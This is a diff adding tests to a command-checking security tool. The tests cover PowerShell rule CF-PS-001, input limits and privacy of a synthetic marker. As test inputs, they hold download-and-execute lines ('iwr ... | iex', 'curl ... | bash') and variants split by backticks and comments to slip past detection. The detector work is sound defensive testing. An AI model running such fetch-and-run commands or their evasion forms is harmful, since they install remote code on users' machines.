@@ -9,10 +9,10 @@ import unittest
 ROOT = Path(__file__).resolve().parents[1]
 
 
-def run_cli(command: str, data: bytes) -> subprocess.CompletedProcess[bytes]:
+def run_cli(command: str, data: bytes, *, shell: str | None = None) -> subprocess.CompletedProcess[bytes]:
     env = dict(os.environ, PYTHONPATH=str(ROOT / "src"))
     return subprocess.run(
-        [sys.executable, "-m", "sentinel", command],
+        [sys.executable, "-m", "sentinel", command] + (["--shell", shell] if shell else []),
         input=data,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
@@ -132,6 +132,52 @@ class CliTests(unittest.TestCase):
                 self.assertEqual(result.stderr, b"")
                 self.assertEqual(len(json.loads(result.stdout)), count)
                 self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stdout)
+
+    def test_powershell_cli_selection_and_privacy(self):
+        text = b"iwr https://example.invalid/SYNTHETIC_PRIVATE_MARKER | iex"
+        result = run_cli("check-command", text, shell="powershell")
+        self.assertEqual(result.returncode, 0)
+        self.assertEqual(result.stderr, b"")
+        self.assertEqual(json.loads(result.stdout)[0]["rule_id"], "CF-PS-001")
+        self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stdout)
+        self.assertEqual(json.loads(run_cli("check-command", text).stdout), [])
+        bash = b"curl https://example.invalid/a | bash"
+        self.assertEqual(run_cli("check-command", bash).stdout, run_cli("check-command", bash, shell="bash").stdout)
+        self.assertEqual(json.loads(run_cli("check-command", bash, shell="powershell").stdout), [])
+
+    def test_powershell_cli_lexical_regressions(self):
+        for newline in (b"\n", b"\r\n"):
+            for text in (
+                b"iwr`" + newline + b" https://example.invalid/SYNTHETIC_PRIVATE_MARKER | iex",
+                b"iwr https://example.invalid/SYNTHETIC_PRIVATE_MARKER`" + newline + b" | iex",
+                b'iwr https://example.invalid/SYNTHETIC_PRIVATE_MARKER <# "note' + newline + b"more #> | iex",
+            ):
+                with self.subTest(text=text):
+                    result = run_cli("check-command", text, shell="powershell")
+                    self.assertEqual(result.returncode, 0)
+                    self.assertEqual(result.stderr, b"")
+                    findings = json.loads(result.stdout)
+                    self.assertEqual(len(findings), 1)
+                    self.assertEqual(findings[0]["rule_id"], "CF-PS-001")
+                    self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stdout)
+
+    def test_powershell_cli_limits_errors_and_invalid_shell(self):
+        exact = run_cli("check-command", b" " * (1024 * 1024), shell="powershell")
+        self.assertEqual(exact.returncode, 0)
+        self.assertEqual(json.loads(exact.stdout), [])
+        for data, shell in (
+            (b"SYNTHETIC_PRIVATE_MARKER" + b"x" * (1024 * 1024), "powershell"),
+            (b"SYNTHETIC_PRIVATE_MARKER\xff", "powershell"),
+            (b'iwr "SYNTHETIC_PRIVATE_MARKER', "powershell"),
+            (b"SYNTHETIC_PRIVATE_MARKER", "unknown"),
+        ):
+            with self.subTest(length=len(data), shell=shell):
+                result = run_cli("check-command", data, shell=shell)
+                self.assertEqual(result.returncode, 2)
+                self.assertEqual(result.stdout, b"")
+                self.assertNotIn(b"SYNTHETIC_PRIVATE_MARKER", result.stderr)
+                self.assertNotIn(b"Traceback", result.stderr)
+        self.assertEqual(run_cli("scan", b"", shell="powershell").returncode, 2)
 
     def test_check_command_input_limits_and_errors(self):
         exact = run_cli("check-command", b" " * (1024 * 1024))
